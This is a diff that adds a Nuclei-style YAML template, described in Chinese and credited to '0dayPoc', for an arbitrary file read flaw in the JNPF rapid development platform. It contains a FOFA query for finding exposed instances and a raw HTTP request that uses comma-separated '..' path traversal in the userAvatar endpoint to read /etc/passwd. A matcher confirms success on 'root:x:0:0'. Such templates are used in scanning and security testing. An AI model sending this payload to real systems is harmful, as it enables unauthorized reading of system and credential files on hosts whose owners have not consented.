@@ -1,0 +1,26 @@
+id: jnpf-platform-useravatar-file-read
+
+info:
+  name: JNPF快速开发平台 userAvatar 接口任意文件读取漏洞
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: title="JNPF快速开发平台"
+      该系统在处理用户头像请求时未正确校验文件路径参数，攻击者可通过构造恶意请求读取任意文件内容。
+  tags: JNPF快速开发平台
+
+http:
+- raw:
+  - |
+    GET /api/file/Image/userAvatar/aa,..,..,..,..,..,..,..,..,..,etc,passwd HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Accept-Encoding: gzip, deflate
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'root:x:0:0'
